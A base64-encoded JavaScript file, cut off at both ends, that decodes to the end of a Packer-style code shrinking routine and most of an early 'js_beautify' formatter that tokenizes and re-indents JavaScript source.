YS5leGVjKGYsZnVuY3Rpb24oYSxjLGQpe3ZhciBiPSJceDAxIitlLmxlbmd0aCsiXHgwMSI7aWYoZCl7Yj1jK2I7YT1kfWUucHVzaChhKTtyZXR1cm4gYn0pfSxzaHJpbms6ZnVuY3Rpb24oZyl7Zz10aGlzLmVuY29kZURhdGEoZyk7ZnVuY3Rpb24gbihhKXtyZXR1cm4gbmV3IFJlZ0V4cChhLnNvdXJjZSwiZyIpfTt2YXIgdT0vKChjYXRjaHxkb3xpZnx3aGlsZXx3aXRofGZ1bmN0aW9uKVxiW15+e307XSooXChccypbXnt9O10qXHMqXCkpXHMqKT8oXHtbXnt9XSpcfSkvO3ZhciBHPW4odSk7dmFyIHg9L1x7W157fV0qXH18XFtbXlxbXF1dKlxdfFwoW15cKFwpXSpcKXx+W15+XSt+Lzt2YXIgSD1uKHgpO3ZhciBEPS9+Iz8oXGQrKX4vO3ZhciBJPS9bYS16QS1aXyRdW1x3XCRdKi9nO3ZhciBKPS9+IyhcZCspfi87dmFyIEw9L1xidmFyXGIvZzt2YXIgTT0vXGJ2YXJccytbXHckXStbXjsjXSp8XGJmdW5jdGlvblxzK1tcdyRdKy9nO3ZhciBOPS9cYih2YXJ8ZnVuY3Rpb24pXGJ8XHNpblxzK1teO10rL2c7dmFyIE89L1xzKj1bXiw7XSovZzt2YXIgcz1bXTt2YXIgRT0wO2Z1bmN0aW9uIFAoYSxjLGQsYixmKXtpZighYyljPSIiO2lmKGQ9PSJmdW5jdGlvbiIpe2Y9Yit5KGYsSik7Yz1jLnJlcGxhY2UoeCwiIik7Yj1iLnNsaWNlKDEsLTEpO2lmKGIhPSJfbm9fc2hyaW5rXyIpe3ZhciBlPW1hdGNoKGYsTSkuam9pbigiOyIpLnJlcGxhY2UoTCwiO3ZhciIpO3doaWxlKHgudGVzdChlKSl7ZT1lLnJlcGxhY2UoSCwiIil9ZT1lLnJlcGxhY2UoTiwiIikucmVwbGFjZShPLCIiKX1mPXkoZixEKTtpZihiIT0iX25vX3Nocmlua18iKXt2YXIgaD0wLEM7dmFyIGs9bWF0Y2goW2IsZV0sSSk7dmFyIGw9e307Zm9yKHZhciByPTA7cjxrLmxlbmd0aDtyKyspe2lkPWtbcl07aWYoIWxbIiMiK2lkXSl7bFsiIyIraWRdPXRydWU7aWQ9cmVzY2FwZShpZCk7d2hpbGUobmV3IFJlZ0V4cChvLlBSRUZJWCtoKyJcXGIiKS50ZXN0KGYpKWgrKzt2YXIgbT1uZXcgUmVnRXhwKCIoW15cXHckLl0pIitpZCsiKFteXFx3JDpdKSIpO3doaWxlKG0udGVzdChmKSl7Zj1mLnJlcGxhY2UobihtKSwiJDEiK28uUFJFRklYK2grIiQyIil9dmFyIG09bmV3IFJlZ0V4cCgiKFteeyxcXHckLl0pIitpZCsiOiIsImciKTtmPWYucmVwbGFjZShtLCIkMSIrby5QUkVGSVgraCsiOiIpO2grK319RT1NYXRoLm1heChFLGgpfXZhciB0PWMrIn4iK3MubGVuZ3RoKyJ+IjtzLnB1c2goZil9ZWxzZXt2YXIgdD0ifiMiK3MubGVuZ3RoKyJ+IjtzLnB1c2goYytmKX1yZXR1cm4gdH07ZnVuY3Rpb24geShkLGIpe3doaWxlKGIudGVzdChkKSl7ZD1kLnJlcGxhY2UobihiKSxmdW5jdGlvbihhLGMpe3JldHVybiBzW2NdfSl9cmV0dXJuIGR9O3doaWxlKHUudGVzdChnKSl7Zz1nLnJlcGxhY2UoRyxQKX1nPXkoZyxEKTt2YXIgeixRPTA7dmFyIFI9bmV3IHYoby5TSFJVTkssZnVuY3Rpb24oKXtkbyB6PVBhY2tlci5lbmNvZGU1MihRKyspO3doaWxlKG5ldyBSZWdFeHAoIlteXFx3JC5dIit6KyJbXlxcdyQ6XSIpLnRlc3QoZykpO3JldHVybiB6fSk7Zz1SLmVuY29kZShnKTtyZXR1cm4gdGhpcy5kZWNvZGVEYXRhKGcpfX0se0VOQ09ERURfREFUQTovXHgwMShcZCspXHgwMS9nLFBSRUZJWDoiXHgwMiIsU0hSVU5LOi9ceDAyXGQrXGIvZ30pfTsNCmZ1bmN0aW9uIGpzX2JlYXV0aWZ5KGpzX3NvdXJjZV90ZXh0LCBpbmRlbnRfc2l6ZSwgaW5kZW50X2NoYXJhY3RlciwgaW5kZW50X2xldmVsKQ0Kew0KdmFyIGlucHV0LCBvdXRwdXQsIHRva2VuX3RleHQsIGxhc3RfdHlwZSwgbGFzdF90ZXh0LCBsYXN0X3dvcmQsIGN1cnJlbnRfbW9kZSwgbW9kZXMsIGluZGVudF9zdHJpbmc7DQp2YXIgd2hpdGVzcGFjZSwgd29yZGNoYXIsIHB1bmN0LCBwYXJzZXJfcG9zLCBsaW5lX3N0YXJ0ZXJzLCBpbl9jYXNlOw0KdmFyIHByZWZpeCwgdG9rZW5fdHlwZSwgZG9fYmxvY2tfanVzdF9jbG9zZWQsIHZhcl9saW5lLCB2YXJfbGluZV90YWludGVkOw0KZnVuY3Rpb24gdHJpbV9vdXRwdXQoKQ0Kew0Kd2hpbGUgKG91dHB1dC5sZW5ndGggJiYgKG91dHB1dFtvdXRwdXQubGVuZ3RoIC0gMV0gPT09ICcgJyB8fCBvdXRwdXRbb3V0cHV0Lmxlbmd0aCAtIDFdID09PSBpbmRlbnRfc3RyaW5nKSkgew0Kb3V0cHV0LnBvcCgpOw0KfQ0KfQ0KZnVuY3Rpb24gcHJpbnRfbmV3bGluZShpZ25vcmVfcmVwZWF0ZWQpDQp7DQppZ25vcmVfcmVwZWF0ZWQgPSB0eXBlb2YgaWdub3JlX3JlcGVhdGVkID09PSAndW5kZWZpbmVkJyA/IHRydWU6IGlnbm9yZV9yZXBlYXRlZDsNCnRyaW1fb3V0cHV0KCk7DQppZiAoIW91dHB1dC5sZW5ndGgpIHsNCnJldHVybjsgLy8gbm8gbmV3bGluZSBvbiBzdGFydCBvZiBmaWxlDQp9DQppZiAob3V0cHV0W291dHB1dC5sZW5ndGggLSAxXSAhPT0gIlxuIiB8fCAhaWdub3JlX3JlcGVhdGVkKSB7DQpvdXRwdXQucHVzaCgiXG4iKTsNCn0NCmZvciAodmFyIGkgPSAwOyBpIDwgaW5kZW50X2xldmVsOyBpKyspIHsNCm91dHB1dC5wdXNoKGluZGVudF9zdHJpbmcpOw0KfQ0KfQ0KZnVuY3Rpb24gcHJpbnRfc3BhY2UoKQ0Kew0KdmFyIGxhc3Rfb3V0cHV0ID0gb3V0cHV0Lmxlbmd0aCA/IG91dHB1dFtvdXRwdXQubGVuZ3RoIC0gMV0gOiAnICc7DQppZiAobGFzdF9vdXRwdXQgIT09ICcgJyAmJiBsYXN0X291dHB1dCAhPT0gJ1xuJyAmJiBsYXN0X291dHB1dCAhPT0gaW5kZW50X3N0cmluZykgeyAvLyBwcmV2ZW50IG9jY2Fzc2lvbmFsIGR1cGxpY2F0ZSBzcGFjZQ0Kb3V0cHV0LnB1c2goJyAnKTsNCn0NCn0NCmZ1bmN0aW9uIHByaW50X3Rva2VuKCkNCnsNCm91dHB1dC5wdXNoKHRva2VuX3RleHQpOw0KfQ0KZnVuY3Rpb24gaW5kZW50KCkNCnsNCmluZGVudF9sZXZlbCsrOw0KfQ0KZnVuY3Rpb24gdW5pbmRlbnQoKQ0Kew0KaWYgKGluZGVudF9sZXZlbCkgew0KaW5kZW50X2xldmVsLS07DQp9DQp9DQpmdW5jdGlvbiByZW1vdmVfaW5kZW50KCkNCnsNCmlmIChvdXRwdXQubGVuZ3RoICYmIG91dHB1dFtvdXRwdXQubGVuZ3RoIC0gMV0gPT09IGluZGVudF9zdHJpbmcpIHsNCm91dHB1dC5wb3AoKTsNCn0NCn0NCmZ1bmN0aW9uIHNldF9tb2RlKG1vZGUpDQp7DQptb2Rlcy5wdXNoKGN1cnJlbnRfbW9kZSk7DQpjdXJyZW50X21vZGUgPSBtb2RlOw0KfQ0KZnVuY3Rpb24gcmVzdG9yZV9tb2RlKCkNCnsNCmRvX2Jsb2NrX2p1c3RfY2xvc2VkID0gY3VycmVudF9tb2RlID09PSAnRE9fQkxPQ0snOw0KY3VycmVudF9tb2RlID0gbW9kZXMucG9wKCk7DQp9DQpmdW5jdGlvbiBpbl9hcnJheSh3aGF0LCBhcnIpDQp7DQpmb3IgKHZhciBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykNCnsNCmlmIChhcnJbaV0gPT09IHdoYXQpIHsNCnJldHVybiB0cnVlOw0KfQ0KfQ0KcmV0dXJuIGZhbHNlOw0KfQ0KZnVuY3Rpb24gZ2V0X25leHRfdG9rZW4oKQ0Kew0KdmFyIG5fbmV3bGluZXMgPSAwOw0KdmFyIGMgPSAnJzsNCmRvIHsNCmlmIChwYXJzZXJfcG9zID49IGlucHV0Lmxlbmd0aCkgew0KcmV0dXJuIFsnJywgJ1RLX0VPRiddOw0KfQ0KYyA9IGlucHV0LmNoYXJBdChwYXJzZXJfcG9zKTsNCnBhcnNlcl9wb3MgKz0gMTsNCmlmIChjID09PSAiXG4iKSB7DQpuX25ld2xpbmVzICs9IDE7DQp9DQp9DQp3aGlsZSAoaW5fYXJyYXkoYywgd2hpdGVzcGFjZSkpOw0KaWYgKG5fbmV3bGluZXMgPiAxKSB7DQpmb3IgKHZhciBpID0gMDsgaSA8IDI7IGkrKykgew0KcHJpbnRfbmV3bGluZShpID09PSAwKTsNCn0NCn0NCnZhciB3YW50ZWRfbmV3bGluZSA9IChuX25ld2xpbmVzID09PSAxKTsNCmlmIChpbl9hcnJheShjLCB3b3JkY2hhcikpIHsNCmlmIChwYXJzZXJfcG9zIDwgaW5wdXQubGVuZ3RoKSB7DQp3aGlsZSAoaW5fYXJyYXkoaW5wdXQuY2hhckF0KHBhcnNlcl9wb3MpLCB3b3JkY2hhcikpIHsNCmMgKz0gaW5wdXQuY2hhckF0KHBhcnNlcl9wb3MpOw0KcGFyc2VyX3BvcyArPSAxOw0KaWYgKHBhcnNlcl9wb3MgPT09IGlucHV0Lmxlbmd0aCkgew0KYnJlYWs7DQp9DQp9DQp9DQppZiAocGFyc2VyX3BvcyAhPT0gaW5wdXQubGVuZ3RoICYmIGMubWF0Y2goL15bMC05XStbRWVdJC8pICYmIGlucHV0LmNoYXJBdChwYXJzZXJfcG9zKSA9PT0gJy0nKSB7DQpwYXJzZXJfcG9zICs9IDE7DQp2YXIgdCA9IGdldF9uZXh0X3Rva2VuKHBhcnNlcl9wb3MpOw0KYyArPSAnLScgKyB0WzBdOw0KcmV0dXJuIFtjLCAnVEtfV09SRCddOw0KfQ0KaWYgKGMgPT09ICdpbicpIHsgLy8gaGFjayBmb3IgJ2luJyBvcGVyYXRvcg0KcmV0dXJuIFtjLCAnVEtfT1BFUkFUT1InXTsNCn0NCnJldHVybiBbYywgJ1RLX1dPUkQnXTsNCn0NCmlmIChjID09PSAnKCcgfHwgYyA9PT0gJ1snKSB7DQpyZXR1cm4gW2MsICdUS19TVEFSVF9FWFBSJ107DQp9DQppZiAoYyA9PT0gJyknIHx8IGMgPT09ICddJykgew0KcmV0dXJuIFtjLCAnVEtfRU5EX0VYUFInXTsNCn0NCmlmIChjID09PSAneycpIHsNCnJldHVybiBbYywgJ1RLX1NUQVJUX0JMT0NLJ107DQp9DQppZiAoYyA9PT0gJ30nKSB7DQpyZXR1cm4gW2MsICdUS19FTkRfQkxPQ0snXTsNCn0NCmlmIChjID09PSAnOycpIHsNCnJldHVybiBbYywgJ1RLX0VORF9DT01NQU5EJ107DQp9DQppZiAoYyA9PT0gJy8nKSB7DQp2YXIgY29tbWVudCA9ICcnOw0KLy8gcGVlayBmb3IgY29tbWVudCAvKiAuLi4gKi8NCmlmIChpbnB1dC5jaGFyQXQocGFyc2VyX3BvcykgPT09ICcqJykgew0KcGFyc2VyX3BvcyArPSAxOw0KaWYgKHBhcnNlcl9wb3MgPCBpbnB1dC5sZW5ndGgpIHsNCndoaWxlICghIChpbnB1dC5jaGFyQXQocGFyc2VyX3BvcykgPT09ICcqJyAmJiBpbnB1dC5jaGFyQXQocGFyc2VyX3BvcyArIDEpICYmIGlucHV0LmNoYXJBdChwYXJzZXJfcG9zICsgMSkgPT09ICcvJykgJiYgcGFyc2VyX3BvcyA8IGlucHV0Lmxlbmd0aCkgew0KY29tbWVudCArPSBpbnB1dC5jaGFyQXQocGFyc2VyX3Bvcyk7DQpwYXJzZXJfcG9zICs9IDE7DQppZiAocGFyc2VyX3BvcyA+PSBpbnB1dC5sZW5ndGgpIHsNCmJyZWFrOw0KfQ0KfQ0KfQ0KcGFyc2VyX3BvcyArPSAyOw0KcmV0dXJuIFsnLyonICsgY29tbWVudCArICcqLycsICdUS19CTE9DS19DT01NRU5UJ107DQp9DQovLyBwZWVrIGZvciBjb21tZW50IC8vIC4uLg0KaWYgKGlucHV0LmNoYXJBdChwYXJzZXJfcG9zKSA9PT0gJy8nKSB7DQpjb21tZW50ID0gYzsNCndoaWxlIChpbnB1dC5jaGFyQXQocGFyc2VyX3BvcykgIT09ICJceDBkIiAmJiBpbnB1dC5jaGFyQXQocGFyc2VyX3BvcykgIT09ICJceDBhIikgew0KY29tbWVudCArPSBpbnB1dC5jaGFyQXQocGFyc2VyX3Bvcyk7DQpwYXJzZXJfcG9zICs9IDE7DQppZiAocGFyc2VyX3BvcyA+PSBpbnB1dC5sZW5ndGgpIHsNCmJyZWFrOw0KfQ0KfQ0KcGFyc2VyX3BvcyArPSAxOw0KaWYgKHdhbnRlZF9uZXdsaW5lKSB7DQpwcmludF9uZXdsaW5lKCk7DQp9DQpyZXR1cm4gW2NvbW1lbnQsICdUS19DT01NRU5UJ107DQp9DQp9DQppZiAoYyA9PT0gIiciIHx8IC8vIHN0cmluZw0KYyA9PT0gJyInIHx8IC8vIHN0cmluZw0KKGMgPT09ICcvJyAmJg0KKChsYXN0X3R5cGUgPT09ICdUS19XT1JEJyAmJiBsYXN0X3RleHQgPT09ICdyZXR1cm4nKSB8fCAobGFzdF90eXBlID09PSAnVEtfU1RBUlRfRVhQUicgfHwgbGFzdF90eXBlID09PSAnVEtfRU5EX0JMT0NLJyB8fCBsYXN0X3R5cGUgPT09ICdUS19PUEVSQVRPUicgfHwgbGFzdF90eXBlID09PSAnVEtfRU9GJyB8fCBsYXN0X3R5cGUgPT09ICdUS19FTkRfQ09NTUFORCcpKSkpIHsgLy8gcmVnZXhwDQp2YXIgc2VwID0gYzsNCnZhciBlc2MgPSBmYWxzZTsNCmMgPSAnJzsNCmlmIChwYXJzZXJfcG9zIDwgaW5wdXQubGVuZ3RoKSB7DQp3aGlsZSAoZXNjIHx8IGlucHV0LmNoYXJBdChwYXJzZXJfcG9zKSAhPT0gc2VwKSB7DQpjICs9IGlucHV0LmNoYXJBdChwYXJzZXJfcG9zKTsNCmlmICghZXNjKSB7DQplc2MgPSBpbnB1dC5jaGFyQXQocGFyc2VyX3BvcykgPT09ICdcXCc7DQp9IGVsc2Ugew0KZXNjID0gZmFsc2U7DQp9DQpwYXJzZXJfcG9zICs9IDE7DQppZiAocGFyc2VyX3BvcyA+PSBpbnB1dC5sZW5ndGgpIHsNCmJyZWFrOw0KfQ0KfQ0KfQ0KcGFyc2VyX3BvcyArPSAxOw0KaWYgKGxhc3RfdHlwZSA9PT0gJ1RLX0VORF9DT01NQU5EJykgew0KcHJpbnRfbmV3bGluZSgpOw0KfQ0KcmV0dXJuIFtzZXAgKyBjICsgc2VwLCAnVEtfU1RSSU5HJ107DQp9DQppZiAoaW5fYXJyYXkoYywgcHVuY3QpKSB7DQp3aGlsZSAocGFyc2VyX3BvcyA8IGlucHV0Lmxlbmd0aCAmJiBpbl9hcnJheShjICsgaW5wdXQuY2hhckF0KHBhcnNlcl9wb3MpLCBwdW5jdCkpIHsNCmMgKz0gaW5wdXQuY2hhckF0KHBhcnNlcl9wb3MpOw0KcGFyc2VyX3BvcyArPSAxOw0KaWYgKHBhcnNlcl9wb3MgPj0gaW5wdXQubGVuZ3RoKSB7DQpicmVhazsNCn0NCn0NCnJldHVybiBbYywgJ1RLX09QRVJBVE9SJ107DQp9DQpyZXR1cm4gW2MsICdUS19VTktOT1dOJ107DQp9DQppbmRlbnRfY2hhcmFjdGVyID0gaW5kZW50X2NoYXJhY3RlciB8fCAnICc7DQppbmRlbnRfc2l6ZSA9IGluZGVudF9zaXplIHx8IDQ7DQppbmRlbnRfc3RyaW5nID0gJyc7DQp3aGlsZSAoaW5kZW50X3NpemUtLSkgew0KaW5kZW50X3N0cmluZyArPSBpbmRlbnRfY2hhcmFjdGVyOw0KfQ0KaW5wdXQgPSBqc19zb3VyY2VfdGV4dDsNCmxhc3Rfd29yZCA9ICcnOyANCmxhc3RfdHlwZSA9ICdUS19TVEFSVF9FWFBSJzsNCmxhc3RfdGV4dCA9ICcnOw0Kb3V0cHV0ID0gW107DQpkb19ibG9ja19qdXN0X2Nsb3NlZCA9IGZhbHNlOw0KdmFyX2xpbmUgPSBmYWxzZTsNCnZhcl9saW5lX3RhaW50ZWQgPSBmYWxzZTsNCndoaXRlc3BhY2UgPSAiXG5cclx0ICIuc3BsaXQoJycpOw0Kd29yZGNoYXIgPSAnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODlfJCcuc3BsaXQoJycpOw0KcHVuY3QgPSAnKyAtICogLyAlICYgKysgLS0gPSArPSAtPSAqPSAvPSAlPSA9PSA9PT0gIT0gIT09ID4gPCA+PSA8PSA+PiA8PCA+Pj4gPj4+PSA+Pj0gPDw9ICYmICY9IHwgfHwgISAhISAsIDogPyBeIF49IHw9Jy5zcGxpdCgnICcpOw0KbGluZV9zdGFydGVycyA9ICdjb250aW51ZSx0cnksdGhyb3cscmV0dXJuLHZhcixpZixzd2l0Y2gsY2FzZSxkZWZhdWx0LGZvcix3aGlsZSxicmVhayxmdW5jdGlvbicuc3BsaXQoJywnKTsNCmN1cnJlbnRfbW9kZSA9ICdCTE9DSyc7DQptb2RlcyA9IFtjdXJyZW50X21vZGVdOw0KaW5kZW50X2xldmVsID0gaW5kZW50X2xldmVsIHx8IDA7DQpwYXJzZXJfcG9zID0gMDsgDQppbl9jYXNlID0gZmFsc2U7IA0Kd2hpbGUgKHRydWUpIHsNCnZhciB0ID0gZ2V0X25leHRfdG9rZW4ocGFyc2VyX3Bvcyk7DQp0b2tlbl90ZXh0ID0gdFswXTsNCnRva2VuX3R5cGUgPSB0WzFdOw0KaWYgKHRva2VuX3R5cGUgPT09ICdUS19FT0YnKSB7DQpicmVhazsNCn0NCnN3aXRjaCAodG9rZW5fdHlwZSkgew0KY2FzZSAnVEtfU1RBUlRfRVhQUic6DQp2YXJfbGluZSA9IGZhbHNlOw0Kc2V0X21vZGUoJ0VYUFJFU1NJT04nKTsNCmlmIChsYXN0X3R5cGUgPT09ICdUS19FTkRfRVhQUicgfHwgbGFzdF90eXBlID09PSAnVEtfU1RBUlRfRVhQUicpIHsNCn0gZWxzZSBpZiAobGFzdF90eXBlICE9PSAnVEtfV09SRCcgJiYgbGFzdF90eXBlICE9PSAnVEtfT1BFUkFUT1InKSB7DQpwcmludF9zcGFjZSgpOw0KfSBlbHNlIGlmIChpbl9hcnJheShsYXN0X3dvcmQsIGxpbmVfc3RhcnRlcnMpICYmIGxhc3Rfd29yZCAhPT0gJ2Z1bmN0aW9uJykgew0KcHJpbnRfc3BhY2UoKTsNCn0NCnByaW50X3Rva2VuKCk7DQpicmVhazsNCmNhc2UgJ1RLX0VORF9FWFBSJzoNCnByaW50X3Rva2VuKCk7DQpyZXN0b3JlX21vZGUoKTsNCmJyZWFrOw0KY2FzZSAnVEtfU1RBUlRfQkxPQ0snOg0KaWYgKGxhc3Rfd29yZCA9PT0gJ2RvJykgew0Kc2V0X21vZGUoJ0RPX0JMT0NLJyk7DQp9IGVsc2Ugew0Kc2V0X21vZGUoJ0JMT0NLJyk7DQp9DQppZiAobGFzdF90eXBlICE9PSAnVEtfT1BFUkFUT1InICYmIGxhc3RfdHlwZSAhPT0gJ1RLX1NUQVJUX0VYUFInKSB7DQppZiAobGFzdF90eXBlID09PSAnVEtfU1RBUlRfQkxPQ0snKSB7DQpwcmludF9uZXdsaW5lKCk7DQp9IGVsc2Ugew0KcHJpbnRfc3BhY2UoKTsNCn0NCn0NCnByaW50X3Rva2VuKCk7DQppbmRlbnQoKTsNCmJyZWFrOw0KY2FzZSAnVEtfRU5EX0JMT0NLJzoNCmlmIChsYXN0X3R5cGUgPT09ICdUS19TVEFSVF9CTE9DSycpIHsNCnRyaW1fb3V0cHV0KCk7DQp1bmluZGVudCgpOw0KfSBlbHNlIHsNCnVuaW5kZW50KCk7DQpwcmludF9uZXdsaW5lKCk7DQp9DQpwcmludF90b2tlbigpOw0KcmVzdG9yZV9tb2RlKCk7DQpicmVhazsNCmNhc2UgJ1RLX1dPUkQnOg0KaWYgKGRvX2Jsb2NrX2p1c3RfY2xvc2VkKSB7DQpwcmludF9zcGFjZSgpOw0KcHJpbnRfdG9rZW4oKTsNCnByaW50X3NwYWNlKCk7DQpicmVhazsNCn0NCmlmICh0b2tlbl90ZXh0ID09PSAnY2FzZScgfHwgdG9rZW5fdGV4dCA9PT0gJ2RlZmF1bHQnKSB7DQppZiAobGFzdF90ZXh0ID09PSAnOicpIHsNCnJlbW92ZV9pbmRlbnQoKTsNCn0gZWxzZSB7DQp1bmluZGVudCgpOw0KcHJpbnRfbmV3bGluZSgpOw0KaW5kZW50KCk7DQp9DQpwcmludF90b2tlbigpOw0KaW5fY2FzZSA9IHRydWU7DQpicmVhazsNCn0NCnByZWZpeCA9ICdOT05FJzsNCmlmIChsYXN0X3R5cGUgPT09ICdUS19FTkRfQkxPQ0snKSB7DQppZiAoIWluX2FycmF5KHRva2VuX3RleHQudG9Mb3dlckNhc2UoKSwgWydlbHNlJywgJ2NhdGNoJywgJ2ZpbmFsbHknXSkpIHsNCnByZWZpeCA9ICdORVdMSU5FJzsNCn0gZWxzZSB7DQpwcmVmaXggPSAnU1BBQ0UnOw0KcHJpbnRfc3BhY2UoKTsNCn0NCn0gZWxzZSBpZiAobGFzdF90eXBlID09PSAnVEtfRU5EX0NPTU1BTkQnICYmIChjdXJyZW50X21vZGUgPT09ICdCTE9DSycgfHwgY3VycmVudF9tb2RlID09PSAnRE9fQkxPQ0snKSkgew0KcHJlZml4ID0gJ05FV0xJTkUnOw0KfSBlbHNlIGlmIChsYXN0X3R5cGUgPT09ICdUS19FTkRfQ09NTUFORCcgJiYgY3VycmVudF9tb2RlID09PSAnRVhQUkVTU0lPTicpIHsNCnByZWZpeCA9ICdTUEFDRSc7DQp9IGVsc2UgaWYgKGxhc3RfdHlwZSA9PT0gJ1RLX1dPUkQnKSB7DQpwcmVmaXggPSAnU1BBQ0UnOw0KfSBlbHNlIGlmIChsYXN0X3R5cGUgPT09ICdUS19TVEFSVF9CTE9DSycpIHsNCnByZWZpeCA9ICdORVdMSU5FJzsNCn0gZWxzZSBpZiAobGFzdF90eXBlID09PSAnVEtfRU5EX0VYUFInKSB7DQpwcmludF9zcGFjZSgpOw0KcHJlZml4ID0gJ05FV0xJTkUnOw0KfQ0KaWYgKGxhc3RfdHlwZSAhPT0gJ1RLX0VORF9CTE9DSycgJiYgaW5fYXJyYXkodG9rZW5fdGV4dC50b0xvd2VyQ2FzZSgpLCBbJ2Vsc2UnLCAnY2F0Y2gnLCAnZmluYWxseSddKSkgew0KcHJpbnRfbmV3bGluZSgpOw0KfSBlbHNlIGlmIChpbl9hcnJheSh0b2tlbl90ZXh0LCBsaW5lX3N0YXJ0ZXJzKSB8fCBwcmVmaXggPT09ICdORVdMSU5FJykgew0KaWYgKGxhc3RfdGV4dCA9PT0gJ2Vsc2UnKSB7DQpwcmludF9zcGFjZSgpOw0KfSBlbHNlIGlmICgobGFzdF90eXBlID09PSAnVEtfU1RBUlRfRVhQUicgfHwgbGFzdF90ZXh0ID09PSAnPScpICYmIHRva2VuX3RleHQgPT09ICdmdW5jdGlvbicpIHsNCn0gZWxzZSBpZiAobGFzdF90eXBlID09PSAnVEtfV09SRCcgJiYgKGxhc3RfdGV4dCA9PT0gJ3JldHVybicgfHwgbGFzdF90ZXh0ID09PSAndGhyb3cnKSkgew0KcHJpbnRfc3BhY2UoKTsNCn0gZWxzZSBpZiAobGFzdF90eXBlICE9PSAnVEtfRU5EX0VYUFInKSB7DQppZiAoKGxhc3RfdHlwZSAhPT0gJ1RLX1NUQVJUX0VYUFInIHx8IHRva2VuX3RleHQgIT09ICd2YXInKSAmJiBsYXN0X3RleHQgIT09ICc6Jykgew0KaWYgKHRva2VuX3RleHQgPT09ICdpZicgJiYgbGFzdF90eXBlID09PSAnVEtfV09SRCcgJiYgbGFzdF93b3JkID09PSAnZWxzZScpIHsNCnByaW50X3NwYWNlKCk7DQp9IGVsc2Ugew0KcHJpbnRfbmV3bGluZSgpOw0KfQ0KfQ0KfSBlbHNlIHsNCmlmIChpbl9hcnJheSh0b2tlbl90ZXh0LCBsaW5lX3N0YXJ0ZXJzKSAmJiBsYXN0X3RleHQgIT09ICcpJykgew0KcHJpbnRfbmV3bGluZSgpOw0KfQ0KfQ0KfSBlbHNlIGlmIChwcmVmaXggPT09ICdTUEFDRScpIHsNCnByaW50X3NwYWNlKCk7DQp9DQpwcmludF90b2tlbigpOw0KbGFzdF93b3JkID0gdG9rZW5fdGV4dDsNCmlmICh0b2tlbl90ZXh0ID09PSAndmFyJykgew0KdmFyX2xpbmUgPSB0cnVlOw0KdmFyX2xpbmVfdGFpbnRlZCA9IGZhbHNlOw0KfQ0KYnJlYWs7DQpjYXNlICdUS19FTkRfQ09NTUFORCc6DQpwcmludF90b2tlbigpOw0KdmFyX2xpbmUgPSBmYWxzZTsNCmJyZWFrOw0KY2FzZSAnVEtfU1RSSU5HJzoNCmlmIChsYXN0X3R5cGUgPT09ICdUS19TVEFSVF9CTE9DSycgfHwgbGFzdF90eXBlID09PSAnVEtfRU5EX0JMT0NLJykgew0KcHJpbnRfbmV3bGluZSgpOw0KfSBlbHNlIGlmIChsYXN0X3R5cGUgPT09ICdUS19XT1JEJykgew0KcHJpbnRfc3BhY2UoKTsNCn0NCnByaW50X3Rva2VuKCk7DQpicmVhazsNCmNhc2UgJ1RLX09QRVJBVE9SJzoNCnZhciBzdGFydF9kZWxpbSA9IHRydWU7DQp2YXIgZW5kX2RlbGltID0gdHJ1ZTsNCmlmICh2YXJfbGluZSAmJiB0b2tlbl90ZXh0ICE9PSAnLCcpIHsNCnZhcl9saW5lX3RhaW50ZWQgPSB0cnVlOw0KaWYgKHRva2VuX3RleHQgPT09ICc6Jykgew0KdmFyX2xpbmUgPSBmYWxzZTsNCn0NCn0NCmlmICh0b2tlbl90ZXh0ID09PSAnOicgJiYgaW5fY2FzZSkgew0KcHJpbnRfdG9rZW4oKTsgLy8gY29sb24gcmVhbGx5IGFza3MgZm9yIHNlcGFyYXRlIHRyZWF0bWVudA0KcHJpbnRfbmV3bGluZSgpOw0KYnJlYWs7DQp9DQppbl9jYXNlID0gZmFsc2U7DQppZiAodG9rZW5fdGV4dCA9PT0gJywnKSB7DQppZiAodmFyX2xpbmUpIHsNCmlmICh2YXJfbGluZV90YWludGVkKSB7DQpwcmludF90b2tlbigpOw0KcHJpbnRfbmV3bGluZSgpOw0KdmFyX2xpbmVfdGFpbnRlZCA9IGZhbHNlOw0KfSBlbHNlIHsNCnByaW50X3Rva2VuKCk7DQpwcmludF9zcGFjZSgpOw0KfQ0KfSBlbHNlIGlmIChsYXN0X3R5cGUgPT09ICdUS19FTkRfQkxPQ0snKSB7DQpwcmludF90b2tlbigpOw0KcHJpbnRfbmV3bGluZSgpOw0KfSBlbHNlIHsNCmlmIChjdXJyZW50X21vZGUgPT09ICdCTE9DSycpIHsNCnByaW50X3Rva2VuKCk7DQpwcmludF9uZXdsaW5lKCk7DQp9IGVsc2Ugew0KcHJpbnRfdG9rZW4oKTsNCnByaW50X3NwYWNlKCk7DQp9DQp9DQpicmVhazsNCn0gZWxzZSBpZiAodG9rZW5fdGV4dCA9PT0gJy0tJyB8fCB0b2tlbl90ZXh0ID09PSAnKysnKSB7IC8vIHVuYXJ5IG9wZXJhdG9ycyBzcGVjaWFsIGNhc2UNCmlmIChsYXN0X3RleHQgPT09ICc7Jykgew0KLy8gc3BhY2UgZm9yICg7OyArK2kpDQpzdGFydF9kZWxpbSA9IHRydWU7DQplbmRfZGVsaW0gPSBmYWxzZTsNCn0gZWxzZSB7DQpzdGFydF9kZWxpbSA9IGZhbHNlOw0KZW5kX2RlbGltID0gZmFsc2U7DQp9DQp9IGVsc2UgaWYgKHRva2VuX3RleHQgPT09ICchJyAmJiBsYXN0X3R5cGUgPT09ICdUS19TVEFSVF9FWFBSJykgew0Kc3RhcnRfZGVsaW0gPSBmYWxzZTsNCmVuZF9kZWxpbSA9IGZhbHNlOw0KfSBlbHNlIGlmIChsYXN0X3R5cGUgPT09ICdUS19PUEVSQVRPUicpIHsNCnN0YXJ0X2RlbGltID0gZmFsc2U7DQplbmRfZGVsaW0gPSBmYWxzZTsNCn0gZWxzZSBpZiAobGFzdF90eXBlID09PSAnVEtfRU5EX0VYUFInKSB7DQpzdGFydF9kZWxpbSA9IHRydWU7DQplbmRfZGVsaW0gPSB0cnVlOw0KfSBlbHNlIGlmICh0b2tlbl90ZXh0ID09PSAnLicpIHsNCnN0YXJ0X2RlbGltID0gZmFsc2U7DQplbmRfZGVsaW0gPSBmYWxzZTsNCn0gZWxzZSBpZiAodG9rZW5fdGV4dCA9PT0gJzonKSB7DQppZiAobGFzdF90ZXh0Lm1hdGNoKC9eXGQrJC8pKSB7DQpzdGFydF9kZWxpbSA9IHRydWU7DQp9IGVsc2Ugew0Kc3Rh